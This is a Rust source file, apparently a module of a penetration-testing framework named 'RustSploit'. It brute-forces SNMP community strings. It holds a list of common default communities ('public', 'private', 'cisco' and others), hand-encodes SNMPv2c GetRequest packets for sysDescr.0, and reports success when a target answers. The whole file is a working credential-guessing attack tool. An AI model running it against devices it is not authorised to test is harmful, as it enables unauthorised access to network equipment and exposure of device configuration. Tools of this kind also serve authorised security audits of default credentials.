//! SNMPv1/v2c community-string probe — sends a GetRequest for sysDescr.0
//! and reads the response.

use anyhow::{Context, Result};
use crate::module::{ModuleCtx, ModuleOutcome};
use std::time::Duration;

use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::creds_helper::{self, CredsRun};
use crate::utils::LoginResult;

const DEFAULT_PORT: u16 = 161;

const DEFAULT_COMMUNITIES: &[(&str, &str)] = &[
    ("", "public"),
    ("", "private"),
    ("", "community"),
    ("", "admin"),
    ("", "manager"),
    ("", "default"),
    ("", "secret"),
    ("", "snmp"),
    ("", "cisco"),
    ("", "router"),
];

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "SNMP Community Bruteforce".to_string(),
        description:
            "Tests SNMPv2c community strings via a sysDescr.0 GetRequest. Single-target — \
             scheduler does fan-out."
                .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec!["https://www.rfc-editor.org/rfc/rfc1157".to_string()],
        disclosure_date: None,
        rank: ModuleRank::Normal,
        default_port: Some(161),
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx.target.as_single().context("snmp_bruteforce requires a single-host target")?;
    creds_helper::run(
        target,
        CredsRun {
            service_name: "snmp",
            default_port: DEFAULT_PORT,
            source_module: "creds/generic/snmp_bruteforce",
            defaults: DEFAULT_COMMUNITIES,
            password_only: true,
        },
        |host, port, user, community, timeout| async move {
            drop(user);
            probe(&host, port, &community, timeout).await
        },
    )
    .await
}

async fn probe(host: &str, port: u16, community: &str, timeout: Duration) -> LoginResult {
    use std::net::IpAddr;
    let ip: IpAddr = match host.parse() {
        Ok(ip) => ip,
        Err(e) => { tracing::debug!("parse IP failed: {e}"); match tokio::net::lookup_host(format!("{}:{}", host, port)).await {
            Ok(mut iter) => match iter.next() {
                Some(sa) => sa.ip(),
                None => {
                    return LoginResult::Error {
                        message: "no DNS results".to_string(),
                        retryable: false,
                    }
                }
            },
            Err(e) => {
                return LoginResult::Error {
                    message: format!("dns: {e}"),
                    retryable: false,
                }
            }
        } }
    };
    let sock = match crate::utils::udp_bind(Some(ip)).await {
        Ok(s) => s,
        Err(e) => {
            return LoginResult::Error {
                message: format!("bind: {e}"),
                retryable: false,
            }
        }
    };
    let pkt = build_snmpv2c_get(community, &[1, 3, 6, 1, 2, 1, 1, 1, 0]); // sysDescr.0
    let dest = format!("{}:{}", ip, port);
    if let Err(e) = sock.send_to(&pkt, &dest).await {
        return LoginResult::Error {
            message: format!("send: {e}"),
            retryable: true,
        };
    }
    let mut buf = [0u8; 1500];
    let n = match tokio::time::timeout(timeout, sock.recv_from(&mut buf)).await {
        Ok(Ok((n, _))) => n,
        Ok(Err(e)) => {
            return LoginResult::Error {
                message: format!("recv: {e}"),
                retryable: true,
            }
        }
        Err(e) => {
            tracing::debug!("SNMP recv timed out: {e}");
            return LoginResult::AuthFailed;
        }
    };
    // Quick sanity check: response must be a SEQUENCE (0x30) and contain
    // GetResponse PDU (context-specific tag 0xa2).
    if n >= 2 && buf[0] == 0x30 && buf[..n].contains(&0xa2) {
        LoginResult::Success
    } else {
        LoginResult::AuthFailed
    }
}

/// Minimal hand-rolled SNMPv2c GetRequest builder.
/// Returns SEQUENCE {version=1, community, GetRequest PDU{request-id, 0, 0, varbinds{oid, NULL}}}.
fn build_snmpv2c_get(community: &str, oid: &[u32]) -> Vec<u8> {
    let mut varbind = der_seq([
        der_oid(oid),
        der_null(),
    ].concat());
    varbind = der_seq(varbind);

    let pdu_inner: Vec<u8> = [
        der_int(rand::random::<i32>().wrapping_abs() as i64), // request-id
        der_int(0), // error-status
        der_int(0), // error-index
        varbind,
    ]
    .concat();
    let pdu = der_context_constructed(0, pdu_inner); // GetRequest = 0xa0

    let mut top: Vec<u8> = Vec::new();
    top.extend(der_int(1)); // SNMPv2c
    top.extend(der_octet_string(community.as_bytes()));
    top.extend(pdu);
    der_seq(top)
}

fn der_seq(content: Vec<u8>) -> Vec<u8> {
    der_with_tag(0x30, content)
}
fn der_int(v: i64) -> Vec<u8> {
    let mut bytes = Vec::new();
    let raw = v.to_be_bytes();
    let mut start = 0;
    if v >= 0 {
        while start < 7 && raw[start] == 0 && raw[start + 1] & 0x80 == 0 {
            start += 1;
        }
    }
    bytes.extend_from_slice(&raw[start..]);
    der_with_tag(0x02, bytes)
}
fn der_oid(parts: &[u32]) -> Vec<u8> {
    let mut content = Vec::new();
    if parts.len() >= 2 {
        content.push((parts[0] * 40 + parts[1]) as u8);
        for &part in &parts[2..] {
            let mut tmp = Vec::new();
            let mut v = part;
            tmp.push((v & 0x7f) as u8);
            v >>= 7;
            while v > 0 {
                tmp.push(((v & 0x7f) | 0x80) as u8);
                v >>= 7;
            }
            for b in tmp.iter().rev() {
                content.push(*b);
            }
        }
    }
    der_with_tag(0x06, content)
}
fn der_null() -> Vec<u8> {
    vec![0x05, 0x00]
}
fn der_octet_string(s: &[u8]) -> Vec<u8> {
    der_with_tag(0x04, s.to_vec())
}
fn der_context_constructed(tag_no: u8, content: Vec<u8>) -> Vec<u8> {
    der_with_tag(0xa0 | tag_no, content)
}
fn der_with_tag(tag: u8, content: Vec<u8>) -> Vec<u8> {
    let mut out = Vec::with_capacity(content.len() + 4);
    out.push(tag);
    let len = content.len();
    if len < 0x80 {
        out.push(len as u8);
    } else if len < 0x100 {
        out.extend_from_slice(&[0x81, len as u8]);
    } else if len < 0x10000 {
        out.extend_from_slice(&[0x82, (len >> 8) as u8, len as u8]);
    } else {
        out.extend_from_slice(&[0x83, (len >> 16) as u8, (len >> 8) as u8, len as u8]);
    }
    out.extend(content);
    out
}

crate::register_native_module!(crate::module::Category::Creds, "generic/snmp_bruteforce", native);
